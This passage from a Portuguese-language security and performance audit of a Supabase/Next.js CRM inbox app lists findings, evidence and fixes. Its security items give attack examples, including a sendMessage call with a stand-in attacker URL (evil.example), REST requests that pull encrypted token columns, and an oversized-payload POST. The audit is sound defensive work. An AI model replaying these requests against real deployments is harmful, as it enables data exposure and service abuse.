**O que é:** `sendMessage` recebe `input.attachmentUrl` e `input.attachmentKind` do cliente e repassa sem validação para `sendAttachmentMessage` (graph.ts:193-205), que manda `{attachment:{type: kind, payload:{url}}}` à Meta. O fluxo legítimo gera a URL em `uploadComposerAttachment` (bucket público `crm-uploads`), mas nada impede chamar a action com qualquer URL/tipo. O dono da conversa já é verificado por RLS, então o impacto fica dentro do próprio tenant, mas permite enviar ao lead, em nome da conta, mídia hospedada em servidor de terceiro (rastreamento do download pela Meta, conteúdo trocado depois do envio) e tipos não previstos (`attachmentKind` arbitrário).

**Como acontece:** Usuário logado chama `sendMessage(conversationId, { attachmentUrl: "https://evil.example/x.jpg", attachmentKind: "image" })` via DevTools (ou um script injetado) e a conta da empresa entrega ao lead um arquivo que o atacante controla e pode trocar a qualquer momento.

**Evidência:** composer.actions.ts:115-116 `} else if (input.attachmentUrl && input.attachmentKind) { await sendAttachmentMessage(token, conversation.ig_sender_id, input.attachmentKind, input.attachmentUrl, opts);`; sem `new URL(...)`/prefixo do bucket.

**Recomendação:** Validar que `attachmentUrl` começa com a URL pública do bucket `crm-uploads` do projeto Supabase e que `attachmentKind` está em {image, audio, file}; ou devolver do upload um id interno e resolver a URL no servidor.

### A1-027 [low] getUnreadTotal lê todas as conversas com não lidas em todo render do layout
`src/modules/crm/inbox/services/inbox.queries.ts:193` · optimization · ⚠️ não verificado

**O que é:** O badge da sidebar soma unread_count no Worker depois de buscar todas as linhas com unread_count > 0 (sem agregação). Chamado em src/app/(dashboard)/layout.tsx:33 em toda navegação do painel.

**Como acontece:** Cliente com milhares de conversas não lidas: cada página do painel transfere e soma milhares de linhas só para mostrar um número.

**Evidência:** inbox.queries.ts:194-196 `.select("unread_count").gt("unread_count", 0)` + reduce em JS.

**Recomendação:** Usar agregação (`select('unread_count.sum()')` com aggregates habilitados no PostgREST, ou RPC) ou manter um contador por conta atualizado pelo trigger.

### A1-030 [low] Busca livre do Inbox: curinga '_' não escapado e aspas quebram o filtro `or` do PostgREST
`src/modules/crm/inbox/services/inbox.queries.ts:44` · bug · ⚠️ não verificado

**O que é:** sanitizeSearch remove `,()%*\` mas deixa `_` (curinga de um caractere do ILIKE) e `"` (delimitador de valor no parser do PostgREST). O termo é interpolado em `ig_sender_username.ilike.%q%,last_message_text.ilike.%q%`.

**Como acontece:** Buscar `a"b` retorna erro do PostgREST e a lista mostra 'Não foi possível carregar as conversas'; buscar `joao_silva` casa também 'joaoXsilva' porque `_` vira curinga. Não é falha de segurança (RLS continua), só resultado errado/erro.

**Evidência:** inbox.queries.ts:45 `q.replace(/[,()%*\\]/g, " ")`; 63 `query.or(\`ig_sender_username.ilike.%${q}%,last_message_text.ilike.%${q}%\`)`.

**Recomendação:** Escapar `_` e `%` com `\\` e remover/escapar aspas duplas; ou passar o termo como parâmetro de uma RPC/`textSearch` em vez de montar o filtro `or` por string.

### A2-040 [low] getUnreadTotal soma unread_count em JS lendo todas as conversas não lidas a cada navegação do painel (limitado a 1000 linhas pelo PostgREST)
`src/modules/crm/inbox/services/inbox.queries.ts:193` · optimization · ⚠️ não verificado

**O que é:** Executado no layout de todas as páginas do dashboard (layout.tsx:33), o badge faz `select unread_count from conversations where unread_count > 0` e soma no Worker. Não há índice em unread_count (só `(account_id, last_message_at)`), e o PostgREST devolve no máximo `max_rows` (padrão 1000 no Supabase, a confirmar na configuração): com mais de 1000 conversas não lidas o total fica subcontado, e a cada navegação são transferidas até 1000 linhas para somar um número.

**Como acontece:** Usuário com 3.000 conversas não lidas → badge mostra no máximo a soma de 1.000; cada clique no menu transfere 1.000 linhas.

**Evidência:** inbox.queries.ts:194-196: `.from("conversations").select("unread_count").gt("unread_count", 0)` + `reduce`.

**Recomendação:** Usar uma RPC `sum(unread_count)` (ou view agregada por account) e um índice parcial `conversations (account_id) where unread_count > 0`; considerar cachear por alguns segundos ou carregar o badge via realtime no cliente.

### A3-024 [low] getThread lista sequence_runs ativos com IN (running, waiting_delay, …) sem índice que cubra esses status
`src/modules/crm/inbox/services/inbox.queries.ts:141` · optimization · ⚠️ não verificado

**O que é:** A ficha do lead busca `sequence_runs where account_id = ? and ig_sender_id = ? and status in (running, waiting_reply, waiting_postback, waiting_delay)`. O índice `sequence_runs_waiting_idx (account_id, ig_sender_id)` é parcial para `waiting_reply/waiting_postback`, então um IN que inclui `running` e `waiting_delay` não pode usá-lo; o unique `(sequence_id, ig_sender_id)` começa por sequence_id. Resultado: scan de sequence_runs a cada abertura de conversa e a cada refresh realtime com a thread aberta.

**Como acontece:** 200k runs históricos → cada abertura de conversa no Inbox varre a tabela.

**Evidência:** inbox.queries.ts:141-147: `.from("sequence_runs").select("id, status, updated_at, sequences(name)").eq("account_id", ...).eq("ig_sender_id", ...).in("status", ACTIVE_RUN_STATUSES)`; migrations 0001:152-153 índice parcial só para waiting_reply/postback.

**Recomendação:** Criar índice `sequence_runs (account_id, ig_sender_id) where status in ('running','waiting_reply','waiting_postback','waiting_delay')` (ou um índice não parcial em (account_id, ig_sender_id, status)).

### A1-028 [low] Operações em lote sem limite e sequenciais: 'Trazer conversas existentes' e aplicar tag em massa
`src/modules/crm/pipeline/server/enroll-lead.ts:61` · reliability · ⚠️ não verificado

**O que é:** enrollExistingConversations carrega todas as conversas da conta e chama moveLead uma a uma (cada chamada faz loadStage + currentLeadOf + endOfColumnPosition + insert lead + insert event ≈ 5 queries). applyTagToLeadsBulk (tags.actions.ts:121-143) aceita um array `targets` de tamanho ilimitado vindo do cliente e faz loadContact + upsert por item.

**Como acontece:** Conta com 20k conversas clica em 'Trazer conversas existentes': ~100k queries numa única server action; o Worker estoura o tempo e a UI mostra erro, mas metade dos leads já foi criada (sem transação). Um usuário mal-intencionado manda applyTagToLeadsBulk com 1 milhão de targets da própria conta e prende o Worker.

**Evidência:** enroll-lead.ts:61-70 `for (const conversation of pending) { const result = await moveLead(...) }`; tags.actions.ts:133 `for (const target of targets) { ... await setContactTag(...) }` sem cap.

**Recomendação:** Inscrever em lote com um único `insert ... select` (RPC) + `on conflict do nothing`, ou processar em páginas com cursor como a importação; limitar targets ao tamanho da lista (60) e validar com zod.

### A1-020 [low] Entradas das server actions do funil, notas, status e tags sem validação (sem zod)
`src/modules/crm/pipeline/services/pipeline.actions.ts:44` · bug · ⚠️ não verificado

**O que é:** Nenhuma action valida tipo/forma do input: moveLeadAction aceita `position` qualquer número e `lostReason` sem limite (44-49); updateLeadValueAction grava `value` sem limite/sinal (92-97); createStageAction/updateStageAction gravam `color` texto livre (123-147, 181) que vai para `style={{ backgroundColor }}` em board-column.tsx:44 e `stageType` só confiado pelo check do banco; setConversationStatus (status.actions.ts:9-14) aceita qualquer string e o erro de check vira exceção não tratada (500 para o cliente); createNote (notes.actions.ts:21-37) aceita igSenderId arbitrário; createTag/updateTagColor (tags.actions.ts:42-77) não usam isTagColor e a tabela crm_tags não tem check de cor.

**Como acontece:** Usuário logado chama updateLeadValueAction(id, 1e308) → valueSum da coluna vira Infinity e CURRENCY.format quebra o cabeçalho; createTag(acc, 'x', 'laranja-neon') grava cor fora do enum e TAG_COLOR_CLASSES[color] é undefined em todos os badges; setConversationStatus(id, 'x') derruba a action com erro do Postgres; notas podem ser criadas para ig_sender_id inexistente, ficando órfãs.

**Evidência:** pipeline.actions.ts:97 `.update({ value, updated_at: ... })` sem validar; tags.actions.ts:49 `createTagInCatalog(createAdminClient(), accountId, name, color)` sem isTagColor; 0012_crm_tags.sql:18 `color text not null default 'green'` sem check.

**Recomendação:** Schemas zod por action (uuid para ids, enum para status/stageType/color, number finito e >= 0 para value/position, strings com max). Adicionar check constraint em crm_tags.color e pipeline_stages.color (regex hex).

### A1-032 [low] Operações multi-passo do funil e das tags sem transação (estado parcial em falha)
`src/modules/crm/pipeline/services/pipeline.actions.ts:243` · reliability · ⚠️ não verificado

**O que é:** deleteStageAction move os leads um a um, insere eventos e só então apaga a etapa; moveLead atualiza o lead e depois insere o lead_stage_event (move-lead.ts:188-209); renameTagInCatalog atualiza o catálogo e depois chama crm_tag_rename por grafia (tags-repository.ts:121-128). Qualquer falha no meio deixa dados inconsistentes e as actions não são idempotentes.

**Como acontece:** Falha de rede/tempo do Worker no meio de deleteStageAction: parte dos leads já está na etapa de destino, o histórico foi gravado só para alguns e a etapa continua existindo; o usuário repete e os eventos ficam duplicados. Em renameTag, o catálogo mostra o nome novo mas parte dos contatos segue com o antigo.

**Evidência:** pipeline.actions.ts:263-276 updates em Promise.all, 280-290 insert de eventos, 291 delete da etapa — três passos independentes sem RPC/transação.

**Recomendação:** Mover essas operações para funções SQL (RPC com service role) que rodam numa transação, ou pelo menos ordenar os passos para que o reprocessamento seja idempotente.

### A2-030 [low] Mensagens de erro cruas do Postgres/PostgREST e da Graph API são devolvidas ao navegador por server actions
`src/modules/crm/pipeline/services/pipeline.actions.ts:148` · security · ⚠️ não verificado

**O que é:** `createStageAction` (linha 148), `updateStageAction` (187) e `deleteStageAction` (277 e 292) devolvem `error.message` do Supabase direto; `moveLeadAction` (74) devolve `err.message` de qualquer exceção; `importHistoryStep` (history-import.actions.ts:73) idem; `sendMessage` (composer.actions.ts:57) devolve `Não foi possível enviar: ${err.message}` com a mensagem da Graph API. Esses textos chegam a `toast.error(res.error)` (stage-settings-dialog.tsx:60,67,80,87; pipeline-board.tsx:66) e ao balão pendente (pending-bubble.tsx:35). Mensagens do Postgres expõem nomes de tabelas, colunas, constraints e policies (`new row violates row-level security policy for table "pipeline_stages"`, `duplicate key value violates unique constraint ...`), ajudando a mapear o schema; as da Meta podem conter IDs internos.

**Como acontece:** Usuário logado força um erro (ex.: nome de etapa duplicado, payload inválido via DevTools na action `createStageAction`) e lê no toast o nome da constraint/tabela; repete com variações para enumerar o schema e as policies antes de tentar outras brechas.

**Evidência:** pipeline.actions.ts:148 `if (error) return { error: error.message };`; composer.actions.ts:57 `return \`Não foi possível enviar: ${err.message}\`;`; history-import.actions.ts:71-75 `err instanceof Error ? err.message : "Falha ao importar histórico."`.

**Recomendação:** Logar `error.message` no servidor (console.error) e devolver ao cliente mensagens fixas em português por categoria (conflito, permissão, falha temporária). Para a Graph API, mapear `code/subcode` para textos conhecidos (como já é feito para 10/2018278 e 190) e usar um genérico no resto.

### A1-026 [low] getBoard carrega todos os leads do funil para as estatísticas e faz uma query por coluna
`src/modules/crm/pipeline/services/pipeline.queries.ts:112` · optimization · ⚠️ não verificado

**O que é:** Para contagem/soma por etapa a função lê `stage_id, value` de TODOS os leads do funil (linha 112) e depois faz uma consulta por etapa (121-135). Como a página é force-dynamic e o Realtime chama router.refresh a cada mudança em leads, isso roda a cada evento.

**Como acontece:** Funil com 20k leads: cada render transfere 20k linhas só para somar no Worker; com 8 etapas são 1 + 8 queries por render, multiplicado pelos refreshes do Realtime.

**Evidência:** pipeline.queries.ts:112 `supabase.from("leads").select("stage_id, value").eq("pipeline_id", pipelineId)`; 121-129 `stages.map(async (stage) => { const { data: leadRows } = await supabase.from("leads")...`.

**Recomendação:** Agregar no banco (RPC `select stage_id, count(*), sum(value) group by stage_id` ou agregações do PostgREST) e buscar os 50 primeiros de cada coluna numa única consulta com window function (row_number over partition by stage_id).

### A1-019 [low] Índice fracionário nunca reindexa: needsReindex/MIN_GAP existem mas não são usados
`src/modules/crm/pipeline/utils/fractional-index.ts:32` · bug · ⚠️ não verificado

**O que é:** needsReindex e MIN_GAP só aparecem em testes. use-board-dnd.ts:82 calcula `positionBetween(before, after)` (média) e pipeline.actions.ts/move-lead.ts gravam o valor sem nunca reindexar a coluna. A cada arrastar entre os mesmos dois vizinhos o intervalo cai pela metade; com valores na casa de 65536, após ~50 operações a média deixa de ser distinguível em double e as posições ficam iguais.

**Como acontece:** Usuário arrasta repetidamente um card para entre os mesmos dois cards (ou vários cards para a mesma fresta): posições viram iguais → ordem da coluna fica instável entre renders e o cursor de paginação `.gt("position", afterPosition)` (pipeline.queries.ts:156) pula cards com posição idêntica ('Carregar mais' some com leads).

**Evidência:** grep needsReindex: só fractional-index.ts:32 e o teste; use-board-dnd.ts:82 `const position = positionBetween(before, after);` sem checagem.

**Recomendação:** No servidor (moveLead), quando `after - before < MIN_GAP` (ou quando a posição recebida colide), reindexar a coluna com reindexPositions antes de gravar; desempatar a ordenação por created_at/id.

### A1-025 [low] Filtro por tag varre todos os contatos com tag em JS, página a página, sem usar o índice GIN
`src/modules/crm/tags/server/tagged-contacts.ts:31` · optimization · ⚠️ não verificado

**O que é:** findContactsWithTag pagina `contacts` de 1000 em 1000 (`neq tags '{}'`) e compara em JS com sameTag (normalização de acento). É chamado a cada render do Inbox com ?tag= (inbox.queries.ts:65), em renameTag e deleteTag (tags-repository.ts:134,157). O índice GIN criado em 0012:59 não é usado porque a comparação acontece fora do banco. Além disso, listConversations faz `.in("ig_sender_id", senderIds)` com todos os ids encontrados (inbox.queries.ts:68): milhares de ids estouram o tamanho da query string do PostgREST.

**Como acontece:** Conta com 50k contatos marcados: cada abertura do Inbox filtrado por tag lê 50 páginas de 1000 linhas no Worker e depois monta um `in(...)` gigante que pode falhar (lista vazia com 'Não foi possível carregar as conversas'). O refresh do Realtime repete isso a cada evento.

**Evidência:** tagged-contacts.ts:32-37 `.select("id, account_id, ig_sender_id, tags").neq("tags", "{}").order("id").limit(PAGE)`; inbox.queries.ts:68 `query = query.in("ig_sender_id", senderIds);`.

**Recomendação:** Guardar as tags já normalizadas (coluna gerada `tags_norm text[]` ou normalizar na gravação) e filtrar com `cs`/`&&` usando o GIN; no Inbox, fazer o filtro por tag via join/subselect (RPC) em vez de `in` com a lista inteira.

### A3-022 [low] attachTagsToConversations consulta contacts só por ig_sender_id, sem account_id, o que impede o uso do índice único (account_id, ig_sender_id)
`src/modules/crm/tags/services/tags.queries.ts:93` · optimization · ⚠️ não verificado

**O que é:** A consulta `contacts.select(...).in("ig_sender_id", senderIds)` roda em toda renderização do Inbox (até 60 ids). O único índice que contém ig_sender_id é o unique `(account_id, ig_sender_id)`, cuja coluna inicial é account_id; sem ela o planner tende a varrer a tabela (o RLS acrescenta `account_id in (subselect)`, mas ainda sem igualdade por conta). O código já tem `accountIds` calculado na linha 90 e não o usa nessa consulta.

**Como acontece:** Tabela contacts com 100k linhas → seq scan por render do Inbox e por evento realtime.

**Evidência:** tags.queries.ts:92-93: `supabase.from("contacts").select("account_id, ig_sender_id, tags").in("ig_sender_id", senderIds)` (accountIds existe na linha 90 e só é usado para crm_tags).

**Recomendação:** Acrescentar `.in("account_id", accountIds)` à consulta de contacts.

### A1-040 [low] Colunas FK sem índice: excluir uma rule/sequence/conversa ou apagar um usuário varre tabelas grandes (interactions, messages, sequence_runs)
`supabase/migrations/0001_init.sql:164` · optimization · ⚠️ não verificado

**O que é:** Várias FKs com `on delete set null`/`cascade` não têm índice na coluna referenciadora, então cada delete do pai executa um seq scan na tabela filha: interactions.matched_rule_id (0001:164) e interactions.sequence_id (0001:166) — interactions é a tabela de log, escrita a todo evento; sequence_runs.entry_rule_id (0002:33-35); conversations.contact_id (0009:26); messages.sent_by (0009:64), crm_notes.author_id (0011:40) e lead_stage_events.moved_by (0013:92) referenciam auth.users; pipeline_stages.on_enter_sequence_id (0013:45); rule_triggers.account_id (0001:95), sequence_versions.account_id (0008:9) e lead_stage_events.account_id (0013:88) só têm índice por outra coluna; rules.account_id e sequences.account_id têm apenas índice parcial `where is_active`.

**Como acontece:** deleteRule (rules/actions.ts:421) ou o sweep de expiração com expire_action='delete' (expiry/sweep.ts:31-36, roda a cada minuto e em cada webhook) dispara `update interactions set matched_rule_id = null where matched_rule_id = $1` sem índice → varredura completa de interactions a cada rule apagada. O purge LGPD (`auth.admin.deleteUser`) cascateia por ig_accounts e varre messages/crm_notes/lead_stage_events inteiras para anular sent_by/author_id/moved_by, segurando locks durante a transação.

**Evidência:** 0001_init.sql:164 `matched_rule_id uuid references public.rules (id) on delete set null,` e 0001_init.sql:166 `sequence_id uuid references public.sequences (id) on delete set null,` — os únicos índices de interactions são (account_id, created_at desc) e (account_id, status).

**Recomendação:** Adicionar índices nas colunas FK citadas (ex.: `create index interactions_matched_rule_idx on public.interactions (matched_rule_id) where matched_rule_id is not null;`, idem sequence_id, sequence_runs.entry_rule_id, conversations.contact_id, messages.sent_by, crm_notes.author_id, lead_stage_events.moved_by/account_id, rule_triggers.account_id, sequence_versions.account_id) e índices simples por account_id em rules e sequences (as listagens do painel não filtram is_active e não aproveitam os parciais).

### A1-043 [low] processed_events e stripe_events crescem sem limite: nenhuma rotina apaga mids/eventos antigos
`supabase/migrations/0001_init.sql:106` · reliability · ⚠️ não verificado

**O que é:** processed_events recebe 1 linha por mensagem, postback e comentário recebidos (process.ts:235-238, 619-620, 781-782, 838-839) e stripe_events 1 por evento da Stripe (webhooks/stripe/route.ts:53). Não há TTL, índice por created_at nem delete em lugar nenhum (grep em src só acha inserts); o cron de purge (purge.ts) só apaga usuários cancelados. A Meta reentrega webhooks por no máximo algumas horas/dias, então linhas com mais de ~7 dias não servem para nada, mas ficam para sempre, inflando o banco (e o backup) proporcionalmente ao volume total de DMs de todos os clientes.

**Como acontece:** Com N mil mensagens/dia, a tabela ganha N mil linhas/dia indefinidamente; o insert por PK continua O(log n), mas o espaço em disco (e o custo do plano Supabase) cresce linearmente sem nenhum benefício funcional.

**Evidência:** 0001_init.sql:106-109 `create table if not exists public.processed_events (mid text primary key, created_at timestamptz not null default now());` — nenhum `delete` em processed_events/stripe_events em src.

**Recomendação:** No cron diário de purge, apagar `processed_events where created_at < now() - interval '7 days'` e `stripe_events where received_at < now() - interval '30 days'` (criar índice em created_at/received_at para o delete), ou usar pg_cron no Supabase.

### A3-025 [low] processed_events e interactions crescem sem limite: nenhuma retenção/limpeza
`supabase/migrations/0001_init.sql:106` · optimization · ⚠️ não verificado

**O que é:** `processed_events (mid text primary key)` recebe 1 linha por DM, postback e comentário para sempre; `interactions` recebe 1–2 linhas por evento e `sequence_runs` concluídos nunca são removidos. Não há job de retenção (o cron de purge só apaga usuários cancelados). O índice de texto de processed_events cresce ~100 bytes por evento (1 M eventos ≈ 100 MB) e torna o insert de dedupe (1º passo de cada evento) progressivamente mais caro; as varreduras sem índice citadas acima (recoverStaleRuns, getThread) pioram proporcionalmente.

**Como acontece:** Conta ativa com 20k eventos/dia → 7 M linhas/ano em processed_events e interactions, sem nenhuma consulta que precise de dados com mais de alguns dias/meses.

**Evidência:** migration 0001:106-108 `create table if not exists public.processed_events (mid text primary key, ...)`; nenhum `delete from processed_events` no código (grep em src e migrations).

**Recomendação:** Acrescentar ao cron diário uma limpeza (`delete from processed_events where processed_at < now() - interval '14 days'`; retenção configurável para interactions e runs concluídos) ou particionar por data.

### A1-022 [low] Trigger crm_on_message_insert decide is_latest fora do UPDATE: corrida entre inserts concorrentes pode deixar last_message_* apontando para a mensagem mais antiga
`supabase/migrations/0009_crm_inbox.sql:120` · bug · ⚠️ não verificado

**O que é:** A função calcula `is_latest` com um SELECT separado de `last_message_at` (linhas 120-123) e só depois faz o UPDATE em conversations (125-133). Em READ COMMITTED, duas transações inserindo mensagens da mesma conversa (ex.: lead manda foto + texto quase juntos com o webhook processando em paralelo; webhook da Meta reentregue/paralelo e o recordOutbound do envio; eco + envio) leem o mesmo last_message_at antigo, ambas concluem is_latest = true; a segunda bloqueia no UPDATE até a primeira commitar e então sobrescreve last_message_text/kind/direction com a SUA mensagem, mesmo que created_at seja menor. O resultado é a lista do Inbox e o card do funil mostrando como 'última' uma mensagem anterior até a próxima mensagem chegar. O unread_count não sofre (é incrementado dentro do UPDATE).

**Como acontece:** Lead envia anexo (t=10) e texto (t=11) quase juntos; o webhook processa em paralelo; a transação do texto atualiza primeiro, depois a do anexo sobrescreve last_message_text/kind/direction com o anexo. O Inbox mostra 'Foto' como última mensagem embora o texto seja mais recente. Mesmo cenário quando o webhook grava a mensagem do lead (T2) ao mesmo tempo em que observeOutbound grava a resposta da automação (T1 < T2): a que commitar por último vence, podendo ser a de T1.

**Evidência:** 0009_crm_inbox.sql:120-133 `select c.last_message_at is null or new.created_at >= c.last_message_at into is_latest ...; update public.conversations c set last_message_at = case when is_latest then new.created_at else c.last_message_at end, ...`

**Recomendação:** Fazer a comparação dentro do próprio UPDATE (ex.: `set last_message_at = greatest(c.last_message_at, new.created_at), last_message_text = case when c.last_message_at is null or new.created_at >= c.last_message_at then left(new.text,280) else c.last_message_text end, ...`), que avalia sobre a versão bloqueada/atual da linha, ou `select ... for update` antes; opcionalmente ignorar mensagens com status='failed' ou hidden_at no espelho.

### A1-021 [low] Policies de escrita para o usuário (rules, sequences, sequence_versions, folders, message_presets, quick_replies, crm_notes, crm_tags, contacts) permitem gravar direto pela API, contornando a validação das server actions, e o banco não tem limites de tamanho
`supabase/migrations/0012_crm_tags.sql:38` · security · ⚠️ não verificado

**O que é:** O módulo assume 'escrita só pela service role depois de validar', mas várias tabelas têm policy de escrita para o usuário: crm_tags tem insert/update/delete (0012:38-56), quick_replies e crm_notes são `for all` (0011:55-69), contacts tem update (0004:41-47) e rules, sequences, sequence_versions, folders, message_presets e user_ai_settings são `for all` (ex.: 0001:224-230). Com a anon key + JWT da sessão qualquer usuário logado (inclusive sem assinatura: /api não passa pelo middleware e o RLS só checa posse) grava nessas tabelas sem passar pelas actions, pulando a validação zod. No banco só existem checks de 'não vazio' (`length(trim(x)) > 0`) e enum; não há limite de tamanho em graph jsonb, reply_text, welcome_text, variants jsonb, folders.name (40 chars só na action), crm_tags.name/color (a action restringe a 8 cores; a UI cai no cinza para valor desconhecido, então não há XSS), contacts.fields/tags, user_ai_settings.model. O impacto é de consistência e de custo/estabilidade: o webhook carrega `select('*')` de TODAS as sequences ativas da conta a cada DM (runtime.ts:166-171) e das rules de DM (process.ts:328-333), então um graph de dezenas de MB gravado pela API entra na memória do Worker (limite de 128MB) a cada evento daquela conta, e o payload do webhook da Meta pode agrupar entries de várias contas na mesma invocação.

**Como acontece:** Usuário logado usa PostgREST direto: `POST /rest/v1/sequences` com `graph` de ~50MB e is_active=true → cada DM recebida nessa conta faz o Worker baixar e parsear o blob; se a invocação do webhook estourar memória/tempo, os outros entries do mesmo POST da Meta ficam sem processar até a reentrega. Também: cria tag com cor fora do enum/nome de 10k caracteres (só o unique lower(name) segura), apaga crm_tags sem a propagação crm_tag_remove (tags órfãs em contacts.tags), insere quick_replies/crm_notes sem limite de tamanho, edita contacts.fields/tags com chaves '__' ou valores enormes que depois entram em {{campo}} dos workflows. Só afeta o próprio tenant, mas invalida as validações de tamanho/forma e a consistência catálogo ↔ contatos.

**Evidência:** 0012:38-41 `create policy "own crm_tags insert" ... for insert with check (...)`; 0011:56-61 `create policy "own quick replies" ... for all`; 0004:42-47 `create policy "own contacts update" ... for update`; 0001_init.sql:117 `graph jsonb not null,` sem check de tamanho; 0001:224-230 policy `for all` em sequences; runtime.ts:166-171 `.from("sequences").select("*").eq("account_id", account.id).eq("is_active", true)`.

**Recomendação:** Deixar essas tabelas select-only para o usuário (mesmo padrão de messages/leads e de ig_accounts na 0022), já que toda escrita passa por server action com service role, mantendo a validação única nas actions; se precisar manter escrita direta, adicionar checks de tamanho/formato no banco (`check (pg_column_size(graph) < 1048576)`, `check (length(reply_text) <= 2000)`, `check (length(name) <= 40)`, `check (color in (...))`, `check (array_length(tags,1) <= 50)` etc.).

### A1-042 [low] access_grants: o usuário bloqueado lê o motivo interno do bloqueio e o UUID do admin que o aplicou
`supabase/migrations/0021_admin_access_grants.sql:23` · security · ⚠️ não verificado

**O que é:** A policy "own access grant select" devolve a linha inteira de access_grants (kind, expires_at, reason, granted_by, created_at) para o próprio usuário. `reason` é a nota do admin (1-200 chars, ex.: 'chargeback'/'suspeita de fraude') escrita no painel /admin, e `granted_by` é o UUID do admin. O middleware e a página /assinatura só precisam de kind/expires_at; nenhuma tela do usuário mostra reason (grep em src/app/assinatura e src/middleware.ts não encontra 'reason'), mas pela REST API o usuário lê tudo.

**Como acontece:** Usuário bloqueado faz `GET /rest/v1/access_grants?select=*` com seu JWT e vê `reason` (texto livre do admin, possivelmente com informação sensível sobre a decisão) e `granted_by`.

**Evidência:** 0021_admin_access_grants.sql:23-25 `create policy "own access grant select" on public.access_grants for select using (user_id = auth.uid());` com `reason text not null check (length(reason) between 1 and 200)` na linha 15.

**Recomendação:** Restringir colunas: `revoke select (reason, granted_by) on public.access_grants from authenticated;` (PostgREST com `select=*` passa a omitir as colunas sem privilégio) ou expor uma view `access_grants_public(user_id, kind, expires_at)` para o middleware; manter a leitura completa só pela service role no painel /admin.

### A1-041 [low] Policies de leitura expõem ao navegador do usuário as colunas cifradas access_token_enc e api_key_enc
`supabase/migrations/0022_ig_accounts_select_only.sql:20` · security · ⚠️ não verificado

**O que é:** "own accounts select" (0022:20-21) e "own ai settings" (0016:27-28, `for all`) não restringem colunas: pelo PostgREST com o JWT do usuário, `GET /rest/v1/ig_accounts?select=access_token_enc` e `GET /rest/v1/user_ai_settings?select=api_key_enc` devolvem o ciphertext AES-256-GCM do token do Instagram e da chave de IA. O app inclusive seleciona access_token_enc com o client do usuário (src/app/(dashboard)/accounts/page.tsx:35). O segredo real depende só de TOKEN_ENCRYPTION_KEY, mas ciphertexts coletados hoje (por XSS no painel, extensão maliciosa ou pelo próprio usuário) viram tokens em claro se a chave vazar no futuro, e a policy `for all` de user_ai_settings também deixa o usuário gravar api_key_enc/model/provider arbitrários sem passar pela validação da server action (efeito limitado à própria conta, já que a chave da instalação só vale para admins).

**Como acontece:** Usuário logado (ou script injetado na sessão dele) chama a REST API com a chave anon pública e o access_token da sessão: `GET /rest/v1/ig_accounts?select=id,access_token_enc` → recebe os blobs cifrados de todos os seus tokens; `PATCH /rest/v1/user_ai_settings` grava `model`/`provider` fora da lista validada em saveAiSettings.

**Evidência:** 0016_user_ai_settings.sql:27-28 `create policy "own ai settings" on public.user_ai_settings for all using (user_id = auth.uid()) with check (user_id = auth.uid());` — accounts/page.tsx:35 `.select("id, ig_username, page_name, profile_picture_url, status, connected_at, access_token_enc")` com o client do usuário.

**Recomendação:** Revogar privilégio de coluna para o role authenticated (`revoke select (access_token_enc) on public.ig_accounts from authenticated; revoke select (api_key_enc) on public.user_ai_settings from authenticated;`), ajustando as queries do painel que hoje pedem essas colunas (accounts/page.tsx precisa de um booleano 'tem token', não do blob) ou expondo uma view sem as colunas sensíveis. Trocar "own ai settings" por select-only e mover a escrita para a service role, como foi feito com ig_accounts.

### A3-035 [low] Observabilidade parcial: traces desligados, logs em string concatenada e identificadores de usuário/conta nos logs
`wrangler.toml:32` · config · ⚠️ não verificado

**O que é:** `[observability] enabled = true` liga Workers Logs (CONFORME), mas `observability.traces.enabled` está ausente (default false) e não há `head_sampling_rate` explícito. Todos os 47 `console.*` em src usam prefixo + concatenação (`[access] ...`, `[cron] ...`), não JSON estruturado, dificultando filtro no painel. Alguns logs carregam identificadores: userId (src/lib/billing/access.ts:71 e 109), @username da conta (src/lib/meta/served-account.ts:22, src/lib/meta/token.ts:55), ids de evento Stripe. Erros do cron vão só para console (worker.ts:35-38) sem alerta.

**Como acontece:** Incidente num webhook: sem traces não há latência por dependência (Supabase vs Graph API) para localizar o gargalo; logs não estruturados obrigam busca por texto livre; retenção dos logs com userIds/usernames vira dado pessoal retido fora do banco (LGPD) e, se o Logpush for ativado, sai da Cloudflare. Falhas repetidas do cron (503 por CRON_SECRET ausente, 404 por URL errada) passam despercebidas.

**Evidência:** wrangler.toml:32-33 `[observability]\nenabled = true` (sem `[observability.traces]`); src/lib/billing/access.ts:71 `console.error(`[access] falha ao ler access_grants do usuário ${userId}:`, error.message)`; worker.ts:35 `if (!res.ok) console.error(`[cron] ${path} -> ${res.status} ${await res.text()}`)`.

**Recomendação:** Adicionar `[observability.traces] enabled = true, head_sampling_rate = 0.05` e `[observability.logs] enabled = true, head_sampling_rate = 1`; criar um helper `log(level, {msg, ...campos})` que emite JSON e trocar os `console.*`; reduzir identificadores nos logs (hash curto ou só account_id interno); configurar Cloudflare Notifications para erros do Worker e, para o cron, verificar `Scheduled` no histórico de Trigger Events (a confirmar no painel).

### A2-044 [info] GHSA-2vc4-c4r6-p6v6 (bypass de middleware via cache interception) não afeta o Falow: enableCacheInterception está no padrão false
`open-next.config.ts:3` · security · ⚠️ não verificado

**O que é:** A advisory só vale quando o app chama `defineCloudflareConfig({ enableCacheInterception: true })` e tem rotas cacheadas protegidas por middleware. O Falow usa `defineCloudflareConfig()` sem argumentos; em `node_modules/@opennextjs/cloudflare/dist/api/config.js:9` o default é `enableCacheInterception = false`, e `incrementalCache`/`tagCache`/`queue` ficam em 'dummy' (nenhuma rota é servida de cache). O middleware (`src/middleware.ts`) protege /dashboard e /admin, mas toda request passa por ele antes do servidor Next (`edgeFunctionHandler.js` chama a entry do middleware incondicionalmente), sem caminho de cache que o pule. Registro como info para fechar a pergunta; o upgrade continua recomendado pelo achado do SSRF em /cdn-cgi/image.

**Como acontece:** Não há caminho: `GET /sistema/%64ashboard` passa pelo middleware (que usa `request.nextUrl.pathname`, decodificado) e, sem cache interception, segue para o servidor Next que renderiza dinamicamente após a mesma verificação.

**Evidência:** open-next.config.ts:3 `export default defineCloudflareConfig();`; config.js:9 `enableCacheInterception = false`; OSV: 'An application is affected when it explicitly enables enableCacheInterception'.

**Recomendação:** Nenhuma ação além do upgrade geral; se um dia ativar cache interception ou um incrementalCache real (R2/KV), exigir @opennextjs/cloudflare >= 1.20.2.

### A2-043 [info] Resumo do npm audit: 34 vulnerabilidades, mas quase todas em dependências de build/dev; o que roda no Worker é next, @opennextjs/cloudflare (template) e zod
`package.json:16` · security · ⚠️ não verificado

